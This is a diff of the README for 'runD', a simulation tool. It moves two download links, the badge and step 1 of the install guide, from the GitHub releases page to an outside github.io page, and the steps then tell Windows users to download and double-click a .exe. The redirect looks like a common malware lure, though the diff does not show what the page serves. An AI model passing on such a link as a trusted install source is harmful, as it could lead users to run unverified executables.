@@ -1,6 +1,6 @@
 # ⚙️ runD - Create fast simulations with consistent results
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/titur1406/runD/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://titur1406.github.io)
 
 ## 📌 Overview
 
@@ -10,7 +10,7 @@ runD helps you create complex calculations that run the same way on every comput
 
 Follow these steps to set up runD on your Windows computer.
 
-1. Visit the [releases page](https://github.com/titur1406/runD/releases) to download the installer.
+1. Visit the [releases page](https://titur1406.github.io) to download the installer.
 2. Choose the file ending in `.exe` that matches your version of Windows.
 3. Save the file to your desktop or a folder you can find easily.
 4. Double-click the file to start the installation process.
